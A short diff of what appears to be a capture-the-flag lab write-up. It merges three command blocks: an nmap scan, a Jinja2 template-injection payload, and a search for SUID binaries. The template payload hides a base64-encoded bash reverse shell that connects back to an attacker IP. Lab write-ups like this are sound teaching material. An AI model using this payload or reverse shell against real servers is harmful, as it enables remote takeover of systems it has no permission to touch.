@@ -44,18 +44,8 @@
 
 ```
 nmap -sC -sV 10.10.11.218
-```
-
-
-
-```
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yNy80NDQgMD4mMQo=" | base64 -d | bash').read() }}
 PayloadsAllTheThings/Server Side Template Injection at master · swisskyrepo/PayloadsAllTheThings
-```
-
-
-
-```
 find / -perm -4000 -type f 2>/dev/null
 ```
 
